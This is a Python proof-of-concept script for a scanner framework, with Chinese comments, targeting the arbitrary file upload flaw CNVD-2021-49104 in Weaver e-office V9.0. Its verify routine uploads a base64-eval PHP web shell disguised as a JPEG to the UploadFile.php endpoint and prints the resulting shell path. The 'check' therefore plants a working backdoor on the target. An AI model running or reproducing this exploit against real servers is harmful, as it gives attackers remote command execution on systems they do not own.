from datetime import date
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import error, tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests_toolbelt.multipart.encoder import MultipartEncoder


POC_NAME = "fanwei_cnvd_2021_49104"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class fanwei_cnvd_2021_49104(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0051',    # PoC的VID编号
            'vbid': '',
            'Name': 'fanwei_cnvd_2021_49104',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-01-04',    # PoC创建时间
            },

        'vul': {
            'Product': '泛微oa',    # 漏洞所在产品名称
            'Version': '泛微e-office V9.0',    # 产品的版本号
            'Type': 'File upload',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                CNVD-2021-49104
                泛微e-office 任意文件上传
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-01-12',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        url_vuln = target + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=" # you can change the url here...
    
        xpl_headers = {"Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4", 
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", 
                    "Accept-Language": "en-US,en;q=0.5", 
                    "Accept-Encoding": "gzip, deflate",
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Length": "606"}

        shellCode = '''<?php @eval(base64_decode($_POST[cmd]));?>'''

        multipart_encoder = MultipartEncoder(
            fields={
                "Filedata": (
                    "b.php", shellCode, 'image/jpeg'),
                "typeStr": "File"
            },
            boundary='e64bdf16c554bbc109cecef6451c26a4'
        )
        response = requests.post(url=url_vuln, headers=xpl_headers, data=multipart_encoder, verify=False)


        if response.status_code == 200:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url_vuln    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = response.text
            if verbose:
                highlight("[+] url: " + url_vuln + " 存在泛微e-office 任意文件上传漏洞！！！")
                print("[+] shell path: " + target + "/images/logo/logo-eoffice.php")
        else:
            highlight("[+] url: " + url_vuln + " 不存在泛微e-office 任意文件上传漏洞！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)